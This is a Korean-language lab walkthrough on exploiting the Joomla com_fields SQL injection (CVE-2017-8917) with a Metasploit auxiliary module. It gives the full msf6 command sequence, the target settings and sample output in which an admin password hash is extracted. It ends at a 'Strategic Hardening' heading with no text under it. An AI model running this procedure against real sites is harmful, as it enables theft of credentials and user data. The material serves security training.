SECURITY ARCHITECT

1. 공격 시나리오 분석 (Exploit Scenario Analysis)

이번 실습은 줌라(Joomla)의 com_fields 구성 요소에서 발생하는 SQLi (Structured Query Language Injection)를 타겟팅합니다.

공격의 핵심 (The Core)

CVE-2017-8917은 줌라 코어의 필터링 미흡을 악용합니다. 특정 URL 매개변수에 악의적인 SQL 구문을 추가하여 데이터베이스의 내용을 에러 메시지나 정상 응답에 포함시켜 탈취합니다.

탈취 목표 (Objectives)

  • • 관리자 ID 및 이메일 주소
  • • 암호화된 비밀번호 해시값
  • • 전체 회원 명단 및 데이터베이스 구조

2. 단계별 공격 절차 (Step-by-Step Procedure)

Step 01: Module Selection

모듈 검색 및 선택

최신 메타스플로잇에서 지원하는 줌라 코어 취약점 모듈을 로드합니다.

msf6 > search joomla type:auxiliary gather

 0  auxiliary/gather/joomla_com_fields_sqli   2017-05-17  normal  Joomla com_fields SQLi

msf6 > use 0
Step 02: Targeting

타겟 호스트 및 경로 설정

공격 대상 서버의 IP와 웹 애플리케이션 경로를 설정합니다.

msf6 auxiliary(gather/joomla_com_fields_sqli) > set RHOSTS 192.168.100.7
msf6 auxiliary(gather/joomla_com_fields_sqli) > set TARGETURI /joomla/
msf6 auxiliary(gather/joomla_com_fields_sqli) > show options
Step 03: Launch

공격 실행 및 데이터 탈취

페이로드를 전송하여 데이터베이스 정보를 추출합니다.

msf6 auxiliary(gather/joomla_com_fields_sqli) > run

3. 실습 결과 분석 (Result & Analysis)

공격 성공 시, 다음과 같이 관리자 해시(Admin Hash)가 출력됩니다.

[*] 192.168.100.7:80 - Checking for vulnerability...
[+] 192.168.100.7:80 - Vulnerable! (CVE-2017-8917)
[*] 192.168.100.7:80 - Extracting user data...

admin (ID: 402)
Email: admin@test.local
Password Hash: $2y$10$fWqY8oO9...[생략]

실습 성공 포인트:

메타스플로잇은 추출된 해시값을 자동으로 데이터베이스에 저장합니다. 이후 creds 명령어를 통해 확인 가능합니다.

Strategic Hardening
